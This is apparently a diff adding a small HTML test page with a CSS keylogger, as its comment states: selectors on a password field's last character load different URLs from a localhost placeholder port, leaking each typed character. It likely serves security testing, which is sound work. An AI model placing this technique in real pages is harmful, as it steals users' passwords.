@@ -1,0 +1,9 @@
+<!doctype html><html><head><title>CSS</title>
+<link rel="stylesheet" href="/css/fonts.css">
+<style>
+  /* CSS keylogger: each typed last character of the password loads a different URL. */
+  input[type="password"][value$="a"] { background-image: url("http://localhost:PORT2/k?c=a"); }
+  input[type="password"][value$="b"] { background-image: url("http://localhost:PORT2/k?c=b"); }
+  input[type="password"][value$="c"] { background-image: url("http://localhost:PORT2/k?c=c"); }
+</style>
+</head><body><form><input type="password" name="pw" value=""></form></body></html>
